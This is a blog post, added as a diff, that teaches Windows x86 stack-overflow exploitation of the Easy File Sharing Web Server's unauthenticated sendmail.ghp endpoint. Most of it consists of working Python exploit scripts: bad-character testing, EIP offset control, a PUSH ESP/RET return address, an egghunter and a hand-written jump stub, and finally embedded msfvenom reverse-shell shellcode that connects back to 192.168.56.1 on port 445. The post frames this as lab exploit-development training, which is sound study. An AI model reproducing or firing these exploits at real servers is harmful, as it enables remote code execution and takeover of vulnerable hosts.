@@ -1,0 +1,523 @@
+---
+title:  "Stack Overflow with a twist"
+date:   2018-04-12 15:04:23
+categories: BoF, Fuzzing
+tags: BoF, Fuzzing, Spike
+---
+In the following post I will conver very basic Windows x86 Stack overflow exploit development. This is a continuation of our Fuzzing post, and the starting point will be the PoC covered then.
+
+So, to recap: We have fuzzed the Easy file sharing Web server  by creating a custom fuzzing template for SPIKE. This resulted in the "discovery" of a nice buffer overflow present in the sendmail.ghp service,
+accessible publicly without any authentication. After fuzzing and playing with the buffer length, we found the buffer overflow can be triggered by posting a sequence of 4144 A's. 
+From this we created a skeleton PoC that is enough to crash  and cause a DoS in the application, but what fun is that?
+
+Lets attach the Easy file server to immunity and take a look at the registers during normal execution. Run the EFS.exe program, then attach it to immunity by navigating to file > attach and selecting the 
+EFS process from the list. Then click attached. 
+
+Once attached, the program execution will be paused. To resume, click on the play button in immunity's toolbar. At this point lets take a look at the registers and memory. Mine looks as follows:
+
+![Immunity Overview]({{ "/images/Stack/Overview.png" | absolute_url }})
+
+So whats going on here? dont let the debugger intimidate you, for now lets look at the basics. The top left is the dissassembly window and it shows us the processor instructions. When a program is compiled,
+the compiler turns our C code into machine readable instructions. Our code is turned into a sequence of simple instructions that manipulate the registers of the CPU. These instructions are
+called Opcodes, and what we see in the dissassembly view is the hex representation of these instructions.
+
+To the right of the dissassembly view we have a view of the CPU registers. For now, we will be interested in the general purpose registers, specifically the stack pointer (ESP), the Base pointer (EBP) and the
+instruction pointer (EIP). Generally when a function is called, a new stack frame is located at the current ESP location. The value of ESP is then moved into EBP (mov EBP, ESP) so that EBP = ESP. 
+When parameters are passed to the function they are pushed onto the stack. Since the stack pointer always points to the top of the stack, pushing onto the stack causes ESP to grow towards a more 
+negative address while the base pointer remains unmodified. This allows the program to refer to local function variables passed to the function as offsets of the base pointer. 
+The EIP register is the most important register in exploit development. The instruction pointer acts like a finger that moves along a page you are reading. The EIP holds the address of the instruction
+currently being executed by the CPU. Therefore, if we are able to take control of this register we could theoretically redirect the program's execution flow to a part in memory. Now what if we could also
+place our own code in memory?
+
+Below the register view we have our Stack view. ESP will always sit at top of the stack. Here we can see the status of our current stack, as well as previously called functions that remain on the stack.
+The stack can be modified by push/pop instructions. For Example, a  PUSH EAX  instruction will push the 4 bytes stored in EAX onto the stack (and cause the stack to grow by 4 bytes) while a POP EAX instruction will 
+remove the last 4 bytes from the stack and "pop" them into EAX, therefore setting EAX's value to this.
+
+Lastly, below the dissassembly view we have the dump view. The dump view will show us the hex view of the instructions at a specified address. For example, if we right click on ESP and select follow in dump
+we will be able to see the instructions located at ESP and follow them in the dump.
+
+Ok, with that out of the way, lets begin the fun stuff. Lets fire out PoC and see what we can learn from the debugger. 
+
+![Nothing to see here, just a crash]({{ "/images/Stack/Crash.png" | absolute_url }})
+
+Our application crashed with an Access violation error. Lets take a look at the registers, specifically EIP. See something interesting? EIP has been overwritten by 41's! Turns out that 
+```\x41``` is the hex representation of our ASCII A. We have just overflowed the buffer which has caused us to overwrite the instruction pointer. If you recall, the EIP is in charge of telling the program
+what instruction to execute next. In this case  the program crashed as it can not interpret any instructions located at ```0x41414141```. But what if we supplied a valid address? Preferably with our own set of
+instructions? Lets keep looking and see what else we can learn from the crash.
+
+If we look at the stack pointer, we can see that we have also overwritten the memory pointed at by the stack pointer. If we take a close look, we realize that we have 56 bytes we control at ESP. While this is
+enough to get creative and write some shellcode, that is a topic for another post. Lets keep looking and seeing what else we have. If we scroll up the stack, we can see we have a much larger buffer right
+before ESP! This buffer certainly looks big enough to hold just about any code we want to execute. So, we have a 56 byte buffer pointed at by ESP, and a pretty much unrestricted buffer at lower memory addresses.
+
+The easiest way to exploit this will be to use a multi stage payload. Essentially, we will use a small chunk of code at ESP that is smaller than 56 bytes to jump to our largely controlled buffer where
+we can execute any payload we want. 
+
+So, here is what we need to do:
+
+1. Bad Char Check
+2. Verify control of EIP
+3. Redirect execution flow to ESP
+4. Use a small first stage payload to redirect execution into our big buffer
+5. Choose second stage payload
+6. R00t dance.
+
+1) Bad Char Check
+
+Ok, so now that we have the game plan, how do we execute it? First, we need to check for bad chars.
+
+Sometimes you will find that there are certain characters that will either mutate or truncate your payloads. Finding these characters at the beginning stages of exploit
+development will save us a lot of time when troubleshooting why a 400 byte payload isnt working. The most common of these characters is the null byte, or ```x00```. Consider the following 2 lines:
+
+``` ruby
+char buf[30];
+strcpy(buf,argv[1]);
+```
+
+Here we are declaring a 30 byte buffer to hold some chars, and the strcpy function is passing a user supplied argument into this buffer without any form of size checks. Basically, the function will copy all
+the user supplied data until a null byte is encountered, which marks the end of the input string. A buffer overflow occurs when an argument larger than the allocated buffer is supplied.
+This also explains why having a null byte in your code can mess things up. This character is what marks the end of the supplied string, so having it in your payload (or EIP address) can truncate our
+payload and therefore crash the target.
+
+The most straightforward way to check for bad characters is to send a buffer from ```x01``` to ```xff```, then inspecting memory to see if all our characters made it onto the stack.
+
+Modify our PoC to look like below:
+
+``` ruby
+#!/usr/bin/python
+
+import socket
+import sys
+
+if len(sys.argv) < 2:
+        print "Usage: python EFS.py [IP]\n"
+        print "i.e python  EFS.py 192.168.56.101\n"
+        exit(1)
+
+EIP= "B"*4
+
+BadChar = (
+"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
+"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
+"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
+"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
+"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
+"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
+"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
+"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
+"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
+"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
+"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
+"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
+"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
+"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
+"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
+"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
+)
+
+crash = BadChar + "A"*(4072-len(BadChar))+EIP+"C"*(4144-4076)
+buffer  ="POST /sendmail.ghp HTTP/1.1 \r\n"
+buffer +="Email=" + crash + "&getPassword=Get+Password"
+
+EFS = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+EFS.connect((sys.argv[1], 80))
+EFS.send(buffer)
+EFS.close()
+```
+When we run it, our application crashes, and immediately we can see that our EIP contains \x43\x43\x42\x42. Seeing as the payload lengths are the same, we can already see some characters got mangled in the stack.
+If we examine the stack we can see that ```\x25\x26\x27\x2b``` where either ommitted or replaced by another character. Lets take these out of our bad char buffer and send the payload again.
+
+Great, examining our buffer we see that once again our EIP is overwritten with B's and our stack contains all the characters sent.
+
+2) Verify Control of EIP
+
+Back to the original exploit, We have seen we overwrote EIP with A's, But we have also sent 4144 A's, Any of which could
+be the ones that overwrote our instruction pointer. To help us identify the exact offset, we are going to use metasploit's pattern create. Basically, this will create a unique string of 4144 bytes in length. We can then
+replace our payload with this string, and use metasploit's pattern offset to identify the exact offset of our EIP.
+
+To generate a string, use the following command:
+
+`/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 4144`
+
+Now copy and paste the output into our exploit, replacing the A's.
+
+Restart the EFS server and launch the exploit once again. You should see the following:
+
+![Offset, there you are.]({{ "/images/Stack/Offset.png" | absolute_url }})
+
+We see EIP is now overwritten with ```66463766```. To determine the offset, we will use the following command:
+
+`/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 4144 -q 66463766`
+
+Which tells us the offset is 4072. Lets verify this in our exploit. Replace the payload string with 4072 instances of A plus four instances of B and fill the remainder with C's. Our exploit should
+look like the following:
+
+``` ruby
+#!/usr/bin/python
+
+import socket
+import sys
+
+if len(sys.argv) < 2:
+        print "Usage: python EFS.py [IP]\n"
+        print "i.e python  EFS.py 192.168.56.101\n"
+        exit(1)
+
+
+crash = "A"*4072+"B"*4+"C"*(4144-4076)
+
+buffer  ="POST /sendmail.ghp HTTP/1.1 \r\n" 
+buffer +="Email=" + crash + "&getPassword=Get+Password"
+
+EFS = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+EFS.connect((sys.argv[1], 80))
+EFS.send(buffer)
+EFS.close()
+```
+
+Lets restart the server, attach it to immunity and fire off our exploit. Bingo! EIP has been overwritten with B's. We now have the Offset for EIP, time to redirect execution flow.
+
+3) Redirect Execution flow to ESP
+
+Now that we have control of EIP we need to redirect exection flow. This will always depend on the program being exploited, the buffers available and the state of the registers. Unfortunately not all
+overflows are exploitable, so keep this in mind when working on other exploits. For this particular exploit, we notice that we have control of the buffer at ESP, so it makes sence to redirect execution flow
+there. The way we will do this is by finding the address of a “JMP ESP” or “CALL ESP” instruction, which will tell the program to go to the address of ESP for the next instruction. 
+
+Three ways we can accomplish this is by finding the address of a JMP ESP, CALL ESP or PUSH ESP,RET. The JMP and the CALL work pretty much as the name suggests; JMP will completely redirect execution
+to ESP, while CALL pushes the address of the EIP onto the stack and redirects execution to ESP. Upon encountering a RET instruction, it will go back to the spot before the jump.
+PUSH ESP, RET is a little different. The PUSH ESP will push the address of ESP onto the stack, while the RET will load this value into EIP and redirect execution flow there.
+
+To find an address we can use, we will use Corelan's excellent mona script for immunity. In the command box at the bottom of the debugger, we will use the following command:
+
+`!mona jmp -r esp`
+
+![Corelan's Mona - your new best friend]({{ "/images/Stack/Mona.png" | absolute_url }})
+
+Mona will not only go through the loaded modules and supply some addresses we can use, but it will also show us what memory protections are enabled in each module. For the purposes of this blog post
+we will choose a return address from a DLL with no memory protections (we will cover these a little later). The last address presented has no memory protections enabled, is from one of the server's dll's,
+and offers an address free of bad chars. Modify our skeleton exploit to look like the following:
+
+``` ruby
+#!/usr/bin/python
+
+import socket
+import sys
+
+if len(sys.argv) < 2:
+        print "Usage: python EFS.py [IP]\n"
+        print "i.e python  EFS.py 192.168.56.101\n"
+        exit(1)
+
+#push esp, ret 0x61c5203b
+EIP= "\x3b\x20\xc5\x61"
+
+crash = "A"*4072+EIP+"C"*(4144-4076)
+buffer  ="POST /sendmail.ghp HTTP/1.1 \r\n" 
+buffer +="Email=" + crash + "&getPassword=Get+Password"
+
+EFS = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+EFS.connect((sys.argv[1], 80))
+EFS.send(buffer)
+EFS.close()
+```
+
+A few of you may have noticed the order in which I wrote the address for EIP. No, this is not a typo - The reason for writing the the address backwards has to do with the x86 architechture we are exploiting.
+x86 is little endian, which refers to the order in which the bytes are stored in memory. In little endian architechture, the least significant value (in this case 3b) is stored first. We will explore this a 
+little more in the shellcode section of the blog. 
+
+Save the above exploit, but dont run it yet. This time we are going to follow the execution flow of our payload. To do this, lets place a breakpoint at the return address. We will do this by heading to the
+dissassembly window and right clicking anywhere. Select go to > Expression and input our return address. When the instruction shows up right click on it and toggle a break point. This will pause the program
+once execution hits this point.
+
+After we run the exploit we see something interesting. Our program no longer crashes! instead, Our EIP has been overwriten which has redirected execution flow to our breakpoint, which has paused the program.
+
+![So far so good.]({{ "/images/Stack/Breakpoint.png" | absolute_url }})
+
+Now pay close attention to the stack. If we step through our program and execute the PUSH ESP, we will see the address of ESP being pushed onto the stack. Step through it again and we now see execution redirected
+to our stack of C's! Now, the program will execute anything we place here instead of C's.
+
+![Booyaaaa]({{ "/images/Stack/C.png" | absolute_url }})
+
+4) Use a small first stage payload to redirect execution into our Big buffer.
+
+Here is where it gets fun. We now have to choose our first stage payload. I am going to show two approaches which we will expand on in different posts.
+
+4.1 - The Egg Hunter
+
+The first approach we will discuss is using an egg hunter. An egg hunter is a piece of shellcode which will look through memory for our marker, or egg. Once it encounters this egg, it will redirect
+execution flow here and execute it. In later posts we will go over different egg hunters in depth, but for now we will use metasploit to help us generate one. 
+
+`/usr/share/metasploit-framework/tools/exploit/egghunter.rb -b \x25\x26\x27\x2b -e r00t -f python`  
+
+The b parameter denotes the bad chars. We need to define these so that metasploit knows which characters to avoid. The -e parameter is for our "egg", or the signature that will mark the beginning of 
+our second stage payload. Please note that this needs to be four bytes.
+
+We modify our exploit as follows:
+
+``` ruby
+#!/usr/bin/python
+
+import socket
+import sys
+
+if len(sys.argv) < 2:
+	print "Usage: python EFS.py [IP]\n"
+	print "i.e python  EFS.py 192.168.56.101\n"
+	exit(1)
+
+
+#Bad Chars= \x25\x26\x27\x2b
+#push esp, ret 0x61c5203b
+
+EIP= "\x3b\x20\xc5\x61"
+
+Egghunter = ""
+Egghunter += "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c"
+Egghunter += "\x05\x5a\x74\xef\xb8\x72\x30\x30\x74\x89\xd7\xaf\x75"
+Egghunter += "\xea\xaf\x75\xe7\xff\xe7"
+
+Stage1=Egghunter + "\xcc"*(52-len(Egghunter))
+
+crash = "A"*4072+EIP+"\x90"*16+Stage1
+buffer  ="POST /sendmail.ghp HTTP/1.1 \r\n" 
+buffer +="Email=" + crash + "&getPassword=Get+Password"
+
+EFS = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+EFS.connect((sys.argv[1], 80))
+EFS.send(buffer)
+EFS.close()
+```
+ 
+Now lets launch the exploit. The result is very anticlimatic - Nothing happened! Our program does not crash, but it also does not look to be doing anything.
+However if you open up the task manager, you will notice the CPU is running at 100% capacity. What is happening? Exactly what is supposed to be happening. Our EggHunter is looking through various pages of
+memory looking for our "Egg", however as we have not included it anywhere it just keeps searching indefinitely.
+
+To see the Egghunter working more clearly lets add our Egg somewhere. Modify the following lines as follows:
+
+`Stage2 = "r00tr00t"+"\xcc"*4064`  
+`crash = Stage2+EIP+"\x90"*16+Stage1`
+
+Now, if we launch the exploit again we will see the CPU spike, but rather than running indefinitely we see our program suddenly pause. What happened?
+If we take a look at the dissassembly and register windows we will see that EIP is pointing at our \xcc which acts as INT3 breakpoint. 
+It has hit the breakpoint which if you notice we sent before our first stage shellcode. If we pay close attention to the eight bytes preceeding
+the first INT3 instruction, we notice ```7230307472303074```, which is the hex equivalent of our r00tr00t signature! Our Egghunter has found the egg, and redirected execution flow to the bytes after our egg,
+and executed out INT3 breakpoint which paused execution. From here on the only thing left to do is swap \xcc with some bind tcp shellcode and we will finally have access.
+
+Before this, lets take a look at our second option for redirecting execution 
+
+4.2 - Writing Shellcode
+
+Just as it was the case with the Egg hunter, We will cover writing shellcode much more in different posts. For now we will focus on the minimum and simplest shellcode needed
+to redirect execution flow. 
+
+The way we are going to achieve this is to jump back into our stack. An msfvenom generated shell payload will be around 400 bytes, so if we place it right before our EIP address we will need to jump
+back around ~400 bytes. Our Stage1 payload where we will write the code is at ESP, so we will use this address as our starting point. We are going to use the accumulator register (EAX) to perform our arithmetic by 
+setting it equal to ESP, substracting 400 bytes and redirecting execution flow to it. Keeping our 52 byte restriction and our bad char restriction in mind, The resulting shellcode will be:
+
+``` ruby
+"\x54\x58"     #PUSH ESP, POP EAX --> This sets the value of EAX to ESP by pushing the address of ESP onto the stack and popping it into EAX.
+"\x83\xE8\x7F" #SUB EAX, 7F       --> This substracts 127 bytes from EAX
+"\x83\xE8\x7F" #SUB EAX, 7F       --> This substracts 127 bytes from EAX
+"\x83\xE8\x7F" #SUB EAX, 7F       --> This substracts 127 bytes from EAX
+"\x83\xE8\x13" #SUB EAX, 13       --> This substracts 19  bytes from EAX
+"\x50\x5C"     #PUSH EAX #POP ESP --> This sets the value of ESP to EAX by pushing the address of EAX onto the stack and popping it into ESP.
+"\xFF\xE0"     #JMP EAX	          --> This redirects execution flow to EAX by jumping to it. 
+```
+
+After cleaning up and placing some padding, Our exploit code should look as follows:
+
+``` ruby
+Buffer = "\x90"*3712
+
+Shellcode = (
+"\xcc"*351
+)
+
+Staging=(
+"\x54\x58" #PUSH ESP #POP EAX
+"\x83\xE8\x7F" #SUB EAX, 7C
+"\x83\xE8\x7F" #SUB EAX, 7C
+"\x83\xE8\x7F" #SUB EAX, 7C
+"\x83\xE8\x13" #SUB EAX, 7C
+"\x50\x5C" #PUSH EAX #POP ESP
+"\xFF\xE0" #JMP EAX
+)
+
+Stage1 = Staging + "\x90"*34 			# we add the additional 34 bytes to keep our 52 bytebuffer intact
+Stage2=Buffer+Shell+"\xcc"*(363-len(Shell))	#our shell will be 351 bytes, so jumping back 359 bytes gives us 8 bytes of padding between our Shell and EIP
+Padding="\x90"*16
+
+crash = Stage2+EIP+Padding+Stage1
+
+buffer  ="POST /sendmail.ghp HTTP/1.1 \r\n" 
+buffer +="Email=" + crash + "&getPassword=Get+Password"
+
+EFS = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+EFS.connect((sys.argv[1], 80))
+EFS.send(buffer)
+EFS.close()
+```
+
+Let's set a breakpoint and run the exploit again. As you step through it, pay attention to the EAX and ESP registers.
+After we execute our jmp EAX, we can see that EIP was redirected to the buffer right before our shelcode. If we let it execute, we will see execution stop as soon as it reaches the INT3 instructions we sent
+in the shellode variable.
+
+5) Choose second stage payload
+
+With execution redirected in both cases, the last step is to choose our second stage payload and swap out our shellcode. The payload will depend on many different things, such as our buffer size, and our 
+targets configuration.
+If we are breaching a target's external perimieter, there will likely be a firewall in place. Opening up a port will most likely get flagged as malicious behavior, which may just crash the service and eliminate
+our chances of exploiting the target again. Even if the code executes succesfully, the port may remain blocked by a firewall at the perimeter which again would eliminate our chances of getting in.
+
+A reverse shell is usually prefered. However, outbound connections may still be flagged as suspicious, or could also have connections to the destination port blocked. Consider what else is available. Is SSH
+or remote desktop enabled? is the service running as a privileged user? If so, perhaps adding a user will suffice. There will be times when pre-packaged shellcode such as that generated by metasploit will not
+work, forcing us to think creatively. Before launching your exploit against a production target, consider what a failed exploit will mean to your client and to the test.
+Replicate the target as closely as possible first in a lab, and only once you are absolutely certain of your targets configuration and reliability of your exploit launch it.   
+
+6) r00t dance
+
+Lets generate a reverse shell payload with msfvenom, remembering to encode the payload and define our badchars. The command I used is the following:
+
+`msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=192.168.56.1 LPORT=445 -e x86/shikata_ga_nai -b \x00\x25\x26\x27\x2b -f c`
+
+This resutls in a payload that is 351 bytes which will fit in the buffer we created in our shell exploit. My finished Shell code exploit will look like this:
+
+``` ruby
+#!/usr/bin/python
+
+import socket
+import sys
+
+#Bad Chars= \x25\x26\x27\x2b\x00
+#PUSH ESP, RET 0x61c5203b
+
+EIP= "\x3b\x20\xc5\x61" #PUSH ESP, RET 0x61c5203b
+
+if len(sys.argv) < 2:
+	print "Usage: python EFS.py [IP]\n"
+	print "i.e python  EFS.py 192.168.56.101\n"
+	exit(1)
+
+Buffer = "\x90"*3712
+
+#msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=192.168.56.1 LPORT=445 -e x86/shikata_ga_nai -b \x00\x25\x26\x27\x2b -f c
+Shell=( #352 bytes
+"\xba\x20\xb3\xd2\x36\xdb\xd8\xd9\x74\x24\xf4\x5e\x33\xc9\xb1"
+"\x52\x31\x56\x12\x03\x56\x12\x83\xce\x4f\x30\xc3\xf2\x58\x37"
+"\x2c\x0a\x99\x58\xa4\xef\xa8\x58\xd2\x64\x9a\x68\x90\x28\x17"
+"\x02\xf4\xd8\xac\x66\xd1\xef\x05\xcc\x07\xde\x96\x7d\x7b\x41"
+"\x15\x7c\xa8\xa1\x24\x4f\xbd\xa0\x61\xb2\x4c\xf0\x3a\xb8\xe3"
+"\xe4\x4f\xf4\x3f\x8f\x1c\x18\x38\x6c\xd4\x1b\x69\x23\x6e\x42"
+"\xa9\xc2\xa3\xfe\xe0\xdc\xa0\x3b\xba\x57\x12\xb7\x3d\xb1\x6a"
+"\x38\x91\xfc\x42\xcb\xeb\x39\x64\x34\x9e\x33\x96\xc9\x99\x80"
+"\xe4\x15\x2f\x12\x4e\xdd\x97\xfe\x6e\x32\x41\x75\x7c\xff\x05"
+"\xd1\x61\xfe\xca\x6a\x9d\x8b\xec\xbc\x17\xcf\xca\x18\x73\x8b"
+"\x73\x39\xd9\x7a\x8b\x59\x82\x23\x29\x12\x2f\x37\x40\x79\x38"
+"\xf4\x69\x81\xb8\x92\xfa\xf2\x8a\x3d\x51\x9c\xa6\xb6\x7f\x5b"
+"\xc8\xec\x38\xf3\x37\x0f\x39\xda\xf3\x5b\x69\x74\xd5\xe3\xe2"
+"\x84\xda\x31\xa4\xd4\x74\xea\x05\x84\x34\x5a\xee\xce\xba\x85"
+"\x0e\xf1\x10\xae\xa5\x08\xf3\x11\x91\x2a\x02\xfa\xe0\x4a\x05"
+"\x47\x6d\xac\x6f\xa7\x38\x67\x18\x5e\x61\xf3\xb9\x9f\xbf\x7e"
+"\xf9\x14\x4c\x7f\xb4\xdc\x39\x93\x21\x2d\x74\xc9\xe4\x32\xa2"
+"\x65\x6a\xa0\x29\x75\xe5\xd9\xe5\x22\xa2\x2c\xfc\xa6\x5e\x16"
+"\x56\xd4\xa2\xce\x91\x5c\x79\x33\x1f\x5d\x0c\x0f\x3b\x4d\xc8"
+"\x90\x07\x39\x84\xc6\xd1\x97\x62\xb1\x93\x41\x3d\x6e\x7a\x05"
+"\xb8\x5c\xbd\x53\xc5\x88\x4b\xbb\x74\x65\x0a\xc4\xb9\xe1\x9a"
+"\xbd\xa7\x91\x65\x14\x6c\xa1\x2f\x34\xc5\x2a\xf6\xad\x57\x37"
+"\x09\x18\x9b\x4e\x8a\xa8\x64\xb5\x92\xd9\x61\xf1\x14\x32\x18"
+"\x6a\xf1\x34\x8f\x8b\xd0\x90"
+)
+
+Staging=(
+"\x54\x58" #PUSH ESP #POP EAX
+"\x83\xE8\x7F" #SUB EAX, 7C
+"\x83\xE8\x7F" #SUB EAX, 7C
+"\x83\xE8\x7F" #SUB EAX, 7C
+"\x83\xE8\x13" #SUB EAX, 7C
+"\x50\x5C" #PUSH EAX #POP ESP
+"\xFF\xE0" #JMP EAX
+)
+
+Stage1 = Staging + "\x90"*34
+Stage2=Buffer+Shell+"\xcc"*(360-len(Shell))
+Padding="\x90"*16
+
+crash = Stage2+EIP+Padding+Stage1
+
+buffer  ="POST /sendmail.ghp HTTP/1.1 \r\n" 
+buffer +="Email=" + crash + "&getPassword=Get+Password"
+
+EFS = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+EFS.connect((sys.argv[1], 80))
+EFS.send(buffer)
+EFS.close()
+```
+
+For the Egg Hunting exploit, my exploit looks as follows:
+
+``` ruby
+#!/usr/bin/python
+
+import socket
+import sys
+
+if len(sys.argv) < 2:
+	print "Usage: python EFS.py [IP]\n"
+	print "i.e python  EFS.py 192.168.56.101\n"
+	exit(1)
+
+
+#Bad Chars= \x25\x26\x27\x2b\x00
+#push esp, ret 0x61c5203b
+
+EIP= "\x3b\x20\xc5\x61"
+
+Egghunter  = ""
+Egghunter += "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c"
+Egghunter += "\x05\x5a\x74\xef\xb8\x72\x30\x30\x74\x89\xd7\xaf\x75"
+Egghunter += "\xea\xaf\x75\xe7\xff\xe7"
+
+Stage1=Egghunter + "\xcc"*(52-len(Egghunter))
+
+Stage2 = ("r00tr00t"+ #"\xcc"*4064
+"\xba\x20\xb3\xd2\x36\xdb\xd8\xd9\x74\x24\xf4\x5e\x33\xc9\xb1"
+"\x52\x31\x56\x12\x03\x56\x12\x83\xce\x4f\x30\xc3\xf2\x58\x37"
+"\x2c\x0a\x99\x58\xa4\xef\xa8\x58\xd2\x64\x9a\x68\x90\x28\x17"
+"\x02\xf4\xd8\xac\x66\xd1\xef\x05\xcc\x07\xde\x96\x7d\x7b\x41"
+"\x15\x7c\xa8\xa1\x24\x4f\xbd\xa0\x61\xb2\x4c\xf0\x3a\xb8\xe3"
+"\xe4\x4f\xf4\x3f\x8f\x1c\x18\x38\x6c\xd4\x1b\x69\x23\x6e\x42"
+"\xa9\xc2\xa3\xfe\xe0\xdc\xa0\x3b\xba\x57\x12\xb7\x3d\xb1\x6a"
+"\x38\x91\xfc\x42\xcb\xeb\x39\x64\x34\x9e\x33\x96\xc9\x99\x80"
+"\xe4\x15\x2f\x12\x4e\xdd\x97\xfe\x6e\x32\x41\x75\x7c\xff\x05"
+"\xd1\x61\xfe\xca\x6a\x9d\x8b\xec\xbc\x17\xcf\xca\x18\x73\x8b"
+"\x73\x39\xd9\x7a\x8b\x59\x82\x23\x29\x12\x2f\x37\x40\x79\x38"
+"\xf4\x69\x81\xb8\x92\xfa\xf2\x8a\x3d\x51\x9c\xa6\xb6\x7f\x5b"
+"\xc8\xec\x38\xf3\x37\x0f\x39\xda\xf3\x5b\x69\x74\xd5\xe3\xe2"
+"\x84\xda\x31\xa4\xd4\x74\xea\x05\x84\x34\x5a\xee\xce\xba\x85"
+"\x0e\xf1\x10\xae\xa5\x08\xf3\x11\x91\x2a\x02\xfa\xe0\x4a\x05"
+"\x47\x6d\xac\x6f\xa7\x38\x67\x18\x5e\x61\xf3\xb9\x9f\xbf\x7e"
+"\xf9\x14\x4c\x7f\xb4\xdc\x39\x93\x21\x2d\x74\xc9\xe4\x32\xa2"
+"\x65\x6a\xa0\x29\x75\xe5\xd9\xe5\x22\xa2\x2c\xfc\xa6\x5e\x16"
+"\x56\xd4\xa2\xce\x91\x5c\x79\x33\x1f\x5d\x0c\x0f\x3b\x4d\xc8"
+"\x90\x07\x39\x84\xc6\xd1\x97\x62\xb1\x93\x41\x3d\x6e\x7a\x05"
+"\xb8\x5c\xbd\x53\xc5\x88\x4b\xbb\x74\x65\x0a\xc4\xb9\xe1\x9a"
+"\xbd\xa7\x91\x65\x14\x6c\xa1\x2f\x34\xc5\x2a\xf6\xad\x57\x37"
+"\x09\x18\x9b\x4e\x8a\xa8\x64\xb5\x92\xd9\x61\xf1\x14\x32\x18"
+"\x6a\xf1\x34\x8f\x8b\xd0"
+)
+
+crash = Stage2+"\x90"*(4072-len(Stage2))+EIP+"\x90"*16+Stage1
+
+buffer  ="POST /sendmail.ghp HTTP/1.1 \r\n" 
+buffer +="Email=" + crash + "&getPassword=Get+Password"
+
+EFS = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+EFS.connect((sys.argv[1], 80))
+EFS.send(buffer)
+EFS.close()
+```
+
+In both cases firing this at our development Windows 7 box results in a reverse Shell!
+
+![r00t]({{ "/images/Stack/r00t.png" | absolute_url }})
+
+
